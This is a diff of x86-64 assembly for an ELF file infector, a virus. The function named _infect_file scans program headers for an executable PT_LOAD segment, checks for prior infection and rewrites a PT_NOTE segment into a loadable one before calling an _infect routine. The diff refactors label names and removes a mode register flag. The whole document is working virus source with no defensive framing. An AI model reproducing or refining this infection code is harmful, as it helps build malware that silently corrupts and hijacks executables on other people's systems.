@@ -764,20 +764,20 @@ _infect_file: ; (string rdi, stat rsi)
 	.is_elf_file:
 		; get pt_load exec
 		xor rcx, rcx
-		.get_segment_exec:
-			mov ax, [r13 + E_PHNUM]; e_phnum
-			mov rbx, r13
-			add rbx, [r13 + E_PHOFF]; e_phoff
+		mov rbx, r13
+		add rbx, [r13 + E_PHOFF]; e_phoff
+		mov ax, [r13 + E_PHNUM]; e_phnum
 		.find_segment_exec:
 			inc rcx
 			cmp rcx, rax
 			jge .get_segment_note
 			cmp dword[rbx], PT_LOAD ; p_type != PT_LOAD
-			jne .next
+			jne .next_segment_exec
 			mov dx, [rbx + P_FLAGS]; p_flags
 			and dx, PF_X ; PF_X
 			jnz .check_if_infected
-			.next:
+			.next_segment_exec:
+				mov ax, [r13 + E_PHNUM]; e_phnum
 				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
 			jmp .find_segment_exec
 ; = test
@@ -809,7 +809,7 @@ _infect_file: ; (string rdi, stat rsi)
 			cmp rcx, rax
 			jge .unmap
 			cmp dword[rbx], PT_NOTE ; p_type != PT_NOTE
-			jne .nnext
+			jne .next_segment_note
 			; FOUND !
 			; map
 			push rsi
@@ -865,17 +865,12 @@ _infect_file: ; (string rdi, stat rsi)
 			mov qword[rbx + P_MEMSZ], 0x0
 			mov qword[rbx + P_ALIGN], 0x1000
 
-			push r11
-
 			mov rdi, [r12 + ST_SIZE]
 			add rdi, r13 ; addr pointer -> mmap
 
 			mov rdx, r14
 
-			push 1
-			pop r11; mode PT_NOTE
 			call _infect
-	 		pop r11
 
 			; write file
 			mov rdi, r11
@@ -901,7 +896,7 @@ _infect_file: ; (string rdi, stat rsi)
 			
 			pop r13
 			jmp .unmap
-			.nnext:
+			.next_segment_note:
 				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
 			jmp .find_segment_note
 ;
@@ -918,6 +913,7 @@ _infect_file: ; (string rdi, stat rsi)
 ;			jl .unmap
 			call _ft_memmem
 			pop rcx
+
 			cmp rax, 0x0
 			jne .unmap
 
@@ -931,13 +927,10 @@ _infect_file: ; (string rdi, stat rsi)
 
 			xor r9, r9
 			cmp rsi, r14
-			jl .get_segment_exec ; if size between PT_LOAD isn't enough, search another segment
+			jl .next_segment_exec ; if size between PT_LOAD isn't enough, search another segment
 			mov rdx, r14
 
-			push r11
-			xor r11, r11; mode PT_LOAD
 			call _infect
-			pop r11
 
 	.unmap:
 		push r11; munmap using r11 ?
